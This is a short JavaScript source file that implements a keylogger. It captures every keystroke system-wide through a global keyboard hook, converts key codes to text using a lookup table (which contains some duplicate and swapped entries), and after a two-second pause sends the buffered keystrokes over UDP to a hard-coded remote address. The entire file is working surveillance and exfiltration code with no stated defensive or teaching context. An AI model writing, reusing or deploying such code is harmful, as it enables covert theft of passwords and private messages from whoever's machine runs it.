import dgram from 'dgram';
import ioHook from './iohook';
import { of } from 'rxjs';
import { switchMap, distinctUntilChanged } from 'rxjs/operators';

const client = dgram.createSocket('udp4');
const PORT = 33333;
const HOST = '10.0.0.211';

const ASCII_TABLE = {
  9: 'TAB',
  13: 'ENTER',
  27: 'ESC',
  32: ' ',
  33: '!',
  34: '"',
  35: '#',
  36: '$',
  37: '%',
  39: '\'',
  40: '(',
  38: '&',
  64: '@',
  42: '*',
  41: ')',
  95: '_',
  45: '-',
  43: '+',
  61: '=',
  46: '.',
  44: ',',
  62: '>',
  60: '<',
  59: ';',
  58: ':',
  47: '/',
  63: '?',
  126: '~',
  94: '^',
  195: 'ç',
  135: 'Ç',
  123: '{',
  125: '}',
  92: '\\',
  91: '[',
  93: ']',
  96: '`',
  124: '|',
  48: 0,
  49: 1,
  50: 2,
  51: 3,
  52: 4,
  53: 5,
  54: 6,
  55: 7,
  56: 8,
  57: 9,
  65: 'A',
  66: 'B',
  67: 'C',
  68: 'D',
  69: 'E',
  70: 'F',
  71: 'G',
  72: 'H',
  73: 'I',
  74: 'J',
  75: 'K',
  76: 'L',
  77: 'M',
  78: 'N',
  79: 'O',
  80: 'P',
  81: 'Q',
  82: 'R',
  83: 'S',
  84: 'T',
  85: 'U',
  86: 'V',
  87: 'W',
  88: 'X',
  89: 'Y',
  90: 'Z',
  97: 'a', 	 
  98: 'b',
  99: 'c', 
  100: 'd',
  101: 'e',
  102: 'f',
  103: 'g',
  104: 'h',
  105: 'i',
  106: 'j',
  107: 'k', 	 
  108: 'l',
  109: 'm', 
  110: 'n',
  111: 'o',
  112: 'p',
  113: 'q',
  114: 'r',
  115: 's',
  116: 't', 	 
  117: 'u',
  118: 'v', 
  119: 'x',
  120: 'w',
  121: 'y',
  122: 'z',
  24: ' UPWARDS_ARROW_KEY ',
  25: ' DOWNWARDS_ARROW_KEY ',
  27: ' LEFTWARDS_ARROW_KEY ',
  26: ' RIGHTWARDS_ARROW_KEY ',
  29: ' LEFTRIGHT_ARROW_KEY ',
  65362: ' UPWARDS_ARROW_KEY ',
  65293: ' DOWNWARDS_ARROW_KEY ',
  65393: ' LEFTWARDS_ARROW_KEY ',
  65362: ' RIGHTWARDS_ARROW_KEY ',
};

const parse = ({
  keychar,
  rawcode }) => {
    if(!!keychar){
      return keychar;
    }
    if(!!ASCII_TABLE[Number(rawcode)]){
      return ASCII_TABLE[rawcode];
    }
    return ` rawCode:(${rawcode}) `;
}

let text = "";
let timer = null;
ioHook.on("keydown", event => {  

  const keydown$ = of({ current: text, raw: parse(event)}).pipe(
    distinctUntilChanged(),
    switchMap((t) => {
      text = t.current + t.raw;
      return of(text);
    }),
  );

  keydown$.subscribe((msg)=>{
    if(timer){
      clearTimeout(timer);
      timer = null;
    }
    timer = setTimeout(() => {
      if(msg){
        const message = new Buffer.from(msg);
        client.send(message, 0, message.length, PORT, HOST, () =>{
          text = " ";
        });
      } 
    }, 2000);
  });
    
});
ioHook.start();
